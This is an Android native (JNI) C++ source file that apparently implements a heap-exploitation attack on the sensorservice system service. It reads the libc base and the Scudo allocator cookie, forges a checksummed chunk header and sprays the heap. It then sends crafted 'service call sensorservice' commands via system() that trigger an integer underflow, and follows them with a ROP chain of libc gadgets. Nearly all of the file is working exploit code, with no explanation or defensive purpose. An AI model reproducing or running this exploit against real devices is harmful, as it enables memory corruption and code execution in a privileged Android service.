/*
 * Copyright (C) 2016 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
#include <cstring>
#include <jni.h>
#include <cinttypes>
#include <android/log.h>
#include <string>
#include <sys/syscall.h>
#include <immintrin.h>
#include <time.h>
#include <stdlib.h>

#define LOGI(...) \
  ((void)__android_log_print(ANDROID_LOG_INFO, "hello-libs::", __VA_ARGS__))

/*
 * GLOBAL STATE
 */

int INIT = 0;

/* This is a trivial JNI example where we use a native method
 * to return a new VM String. See the corresponding Java source
 * file located at:
 *
 *   app/src/main/java/com/example/hellolibs/NativeCall.java
 */
extern "C"
JNIEXPORT void JNICALL
Java_com_services_EnumServices_test(JNIEnv *env, jclass thiz) {
    LOGI("Logging from JNI");
}

typedef unsigned short u16;
typedef unsigned int u32;



#define MAX_LINE_LENGTH 256

int get_library_base_address(const char *library_name, unsigned long *base_address) {
    FILE *maps_file = fopen("/proc/self/maps", "r");
    if (maps_file == NULL) {
        perror("Error opening /proc/self/maps");
        return 1;
    }

    char line[MAX_LINE_LENGTH];
    while (fgets(line, sizeof(line), maps_file) != NULL) {
        // Check if the line contains the library name
        if (strstr(line, library_name) != NULL) {
            // Parse the line to get the base address
            if (sscanf(line, "%lx", base_address) != 1) {
                fclose(maps_file);
                return 1;  // Error parsing base address
            }

            fclose(maps_file);
            return 0;  // Success
        }
    }

    fclose(maps_file);
    return 1;  // Library not found
}

static u_int16_t _calc_checksum(u_int32_t cookie, unsigned long address, unsigned long header) {
    u_int32_t _crc = cookie;
    _crc = _mm_crc32_u64(_crc, address);
    _crc = _mm_crc32_u64(_crc, header);
    _crc = _crc ^ (_crc >> 16);

    return _crc & 0xffff;
}

unsigned long get_guess_chunk(){
    int nr_chunk_guesses = 15;
    unsigned long chunk_possibilities[nr_chunk_guesses];
    for(int i=0; i<nr_chunk_guesses; i++) {
        chunk_possibilities[i] = (unsigned long)malloc(0xfe08);
        LOGI("chunk at 0x%lx", chunk_possibilities[i]);
    }
    int chunk_guess_idx = rand() % (nr_chunk_guesses);
    unsigned long chunk_guess = chunk_possibilities[chunk_guess_idx];
    return chunk_guess;
}

extern "C"
JNIEXPORT void JNICALL
Java_com_services_SeccompTest_mallocshit(JNIEnv *env, jclass thiz) {
    unsigned long cookie_offset = 0xe0480; //offset from libc base to scudo cookie
    unsigned long libc_base;
    unsigned long libcpp_base;
    get_library_base_address("libc.so", &libc_base);
    get_library_base_address("libc++.so", &libcpp_base);
    LOGI("libc base: %p", libc_base);
    u32 cookie = *(int*)((void*)(libc_base + cookie_offset));
    LOGI("scudo cookie 0x%x", cookie);
    unsigned long rsp_value;
    asm("movq %%rbp, %0" : "=r" (rsp_value));
    LOGI("Value of RSP: 0x%lx\n", rsp_value);
    // android::Looper::pollOnce
    unsigned long looponce_ret = rsp_value +0x4e98; //TODO: sketchy to pop r14 off the ropchain when returning
    LOGI("target ropchain address: %p", looponce_ret);
    unsigned long fake_chunk_size = 0x20000;
    int ropchain_size = 14*8;
    int target_size_2 = fake_chunk_size-0x300; //some buffer
    int numFds_2 = (target_size_2-0xc-ropchain_size)>>2;
    unsigned long fake_chunk_addr = looponce_ret -(numFds_2<<2)-0xc-0x300-0x10+0x60; //TODO: this is fucked
    LOGI("fake chunk addr: %p", fake_chunk_addr);
    void *chunk = malloc(0xfe08);
    unsigned long chunk_guess = get_guess_chunk();
    LOGI("CHUNK GUESS: 0x%llx", chunk_guess);
    unsigned long fake_chunk_hdr = 0x8100;
    unsigned long fake_chunk_hdr_addr = (unsigned long)&fake_chunk_hdr;
    u_int16_t checksum = _calc_checksum(cookie, chunk_guess, fake_chunk_hdr);
    memcpy((void*)(fake_chunk_hdr_addr+0x6), &checksum, 2);
    LOGI("fully faked header %lx\n", fake_chunk_hdr);
    char* first_call = (char*)malloc(0x1000000);
    int target_size = 0x10000-0x300;
    int underflow_distance = -5 -2*9;
    int numints = underflow_distance -2*underflow_distance-1 + (target_size>>2);
    unsigned long next = 0x0;
    unsigned long prev = 0x0; //next
    unsigned long commitbase = fake_chunk_addr; //CommitBase
    unsigned long commitsize = fake_chunk_size; //CommitSize
    unsigned long mapbase = fake_chunk_addr; //MapBase
    unsigned long mapsize = fake_chunk_size; //MapSize
    unsigned long chunk_hdr = fake_chunk_hdr;
    unsigned long zeros = 0x0;
    unsigned long native_handle_fake = 0xfffffff90000000c;
    unsigned long cmd_location = chunk_guess+8;
    unsigned long cmd_1 = 0x306c4c3348; // we write the log string here 
    unsigned long cmd_2 = 0x3579355f6d305246;
    unsigned long cmd_3 = 0x567233355f4d3354;
    unsigned long cmd_4 = 0x7233;
    char* filler = (char*)malloc(target_size);
    LOGI("%d numints", numints);
    memset(filler, 0, target_size);
    memset(filler, 'A', target_size-1);
    sprintf(first_call, "service call sensorservice 5 s16 wow i32 20 i32 20 i32 1 i32 1 i32 %d i32 %d i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld s16 %s",
            underflow_distance, numints, next, prev, commitbase, commitsize, mapbase, mapsize, zeros, zeros, chunk_hdr, zeros, native_handle_fake, cmd_1, cmd_2, cmd_3, cmd_4, filler);
    for(int i=0; i<40; i++) {
        void *chunk = malloc(0x10000);
        LOGI("chunk at %p", chunk);
    }
    LOGI("firing first attack!");
    system(first_call);
    /*
     * rop chain: writable location (/data/system_ce)
     * */
    unsigned long AAA = 0x4141414141414141;
    unsigned long BBB = 0x4242424242424242;
    unsigned long CCC = 0x4343434343434343;
    unsigned long filler_size = target_size_2>>1;
    char* filler2 = (char*)malloc(filler_size);
    memset(filler2, 0, filler_size);
    memset(filler2, 'A', filler_size-1);
    char* second_call = (char*)malloc(0x1000000);
    int numints_2 = (ropchain_size)>>2;
    /*
     * 0x00000000000606d2 : mov dword ptr [r14 + 0x3c], ebx ; pop rbx ; pop r14 ; pop r15 ; ret
     * after exiting from LoopOnce, we write one qword below ret addres, r14 is popped off the stack
     * we will use this gadget to clobber the version
     * */
    unsigned long r14 = fake_chunk_addr + 0x2bc; //location of the new native_handle whose version we need to clobber TODO: something changes in ropchain size etc, fix this
    unsigned long mov_r14 = libc_base + 0x00000000000606d2;
    unsigned long ret_gadg = libc_base + 0x00000000000451fb;
    // 0x00000000000451fa : pop rdi ; ret
    unsigned long pop_rdi = libc_base + 0x00000000000451fa;
    // 0x0000000000044892 : pop rsi ; ret
    unsigned long pop_rsi = libc_base + 0x0000000000044892;
    unsigned long system_addr = libc_base + 0x730d0;
    unsigned long garbage = 0xdeadbeeffeedbeef;
    // 0x00000000000a5532 : pop rdx ; mov ebx, 0x8948fffa ; ret
    unsigned long pop_rdx = libcpp_base + 0x00000000000a5532;
    unsigned long log_print = (unsigned long)&__android_log_print;
    LOGI("log_print: 0x%lx", log_print);
    LOGI("firing second attack!, numints: %d, numFds: %d", numints_2, numFds_2);
    /*this is just the filedescriptor: i32 1337 i32 1337 i32 0 i32 0 i32 12 i32 -1*/
    sprintf(second_call, "service call sensorservice 5 s16 wow i32 20 i32 20 i32 20 i32 20 i32 %d i32 %d i32 1337 i32 1337 i32 0 i32 0 i32 12 i32 -1 i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 %ld i64 0 i64 0 i64 0 i64 0 i64 0 i64 0 i64 0 i64 0",
            numFds_2, numints_2+2, r14, r14, r14, ret_gadg, mov_r14, AAA, AAA, AAA, pop_rdi, (unsigned long)ANDROID_LOG_INFO, pop_rsi, cmd_location, pop_rdx, cmd_location+8, log_print);
    system(second_call);
    //system(second_call);
    //system(second_call);
}
